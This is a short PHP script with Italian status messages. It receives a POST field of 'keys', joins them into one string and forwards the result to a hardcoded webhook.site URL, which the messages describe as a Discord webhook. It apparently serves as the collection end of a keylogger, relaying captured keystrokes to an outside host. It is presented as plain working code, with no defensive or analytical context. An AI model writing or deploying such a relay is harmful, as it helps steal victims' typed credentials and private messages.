<?php

$webhook_url = 'https://webhook.site/a8cc4cf7-b504-4d89-b4dc-85196ce12cec';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $keys = json_decode($_POST["keys"]);

    if (!empty($keys)) {
        
        $message_content = "" . implode('', $keys);

        $data = json_encode(['content' => $message_content]);

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => $data
            ]
        ];

        $context = stream_context_create($options);
        $response = file_get_contents($webhook_url, false, $context);

        if ($response === false) {
            echo "Errore nell'invio del messaggio al webhook di Discord.";
        } else {
            echo "Messaggio inviato con successo al webhook di Discord!";
        }
    } else {
        echo "Nessun dato da inviare.";
    }
} else {
    echo "Metodo non consentito.";
}

?>

